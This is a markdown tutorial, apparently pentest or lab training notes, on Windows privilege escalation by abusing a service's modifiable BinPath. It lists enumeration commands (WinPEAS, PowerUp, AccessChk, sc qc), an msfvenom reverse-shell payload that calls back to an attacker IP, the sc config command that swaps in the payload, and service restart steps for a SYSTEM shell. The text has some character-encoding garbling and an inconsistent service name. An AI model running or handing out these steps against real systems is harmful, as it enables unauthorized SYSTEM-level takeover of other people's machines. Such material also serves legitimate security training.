
Some Windows services allow users to change their executable path (BinPath). If you can modify this path, you can replace the service with a malicious executable (like a reverse shell). When the service restarts, it runs your payload with high privileges (often SYSTEM).
### **1. Find Vulnerable Services**

RunÂ **WinPEAS**Â orÂ **PowerUp.ps1**Â to find services with weak permissions:
<img width="1124" height="95" alt="image" src="https://github.com/user-attachments/assets/df1185df-d5f6-4c91-938c-ffbd916b36a8" />
OR
<img width="962" height="71" alt="image" src="https://github.com/user-attachments/assets/4adb4cc2-0f89-42dd-8cd4-d013c2b6c810" />

Look for services with:

âœ”Â **SERVICE_CHANGE_CONFIG**Â permission

âœ”Â **Writable BinPath**

*(Example: SupposeÂ `daclsvc`  is vulnerable here.)*

### **2. Check Permissions**

UseÂ **AccessChk**Â to confirm you can modify the service:

```bash
.\accesschk.exe /accepteula -uwcqv user dsclavc
```

<img width="973" height="263" alt="image" src="https://github.com/user-attachments/assets/0db2af6e-3309-4b0c-8402-bfe547b5d526" />

âœ…Â **You need these permissions:**

- **`SERVICE_CHANGE_CONFIG`**Â (to modify the service)
- **`SERVICE_START/STOP`**Â (to restart it)

*(If missing, try another service!)*

### **3. Check Service Details (Optional)**

```
sc qc dsclavc        # Check executable path & privileges
sc query dsclavc     # Check if service is running
```

ðŸ”¹Â **If it runs asÂ `LocalSystem`Â â†’ Perfect!**

Here you can see the `SERVICE_START_NAME` is LocalSystem it means the service runs with **very high privileges** and the `BINARY_PATH_NAME`  which you are going to modify

<img width="1241" height="482" alt="image" src="https://github.com/user-attachments/assets/ca6be8b8-a465-48ca-9b63-0ab47ac25b86" />

### **4. Generate a Reverse Shell**

On your Kali machine:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o evil.exe
```

UploadÂ **`evil.exe`**Â to the victim machine.

### **5. Change the Service BinPath**

```
sc config dsclavc binpath= "C:\Temp\evil.exe"
```

*(ReplaceÂ **`C:\Temp\evil.exe`**Â with your payload path.)*

### **6. Restart the Service**

```
net stop dsclavc
net start dsclavc
```

ðŸŽ‰Â **If successful, you get a reverse shell with SYSTEM privileges!**